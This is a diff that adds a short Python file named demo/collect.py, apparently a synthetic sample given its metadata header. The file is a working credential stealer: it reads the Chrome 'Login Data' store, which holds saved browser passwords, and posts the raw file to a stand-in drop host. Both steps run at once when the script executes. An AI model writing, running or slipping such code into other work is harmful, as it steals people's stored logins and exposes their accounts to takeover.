@@ -1,0 +1,14 @@
+# path: demo/collect.py
+# lines: 8
+# weight: 70
+# ---
+import os, requests
+
+def read_store():
+    path = os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data", "Default", "Login Data")
+    return open(path, "rb").read()
+
+def ship(blob):
+    requests.post("https://drop.invalid/u", data=blob)
+
+ship(read_store())
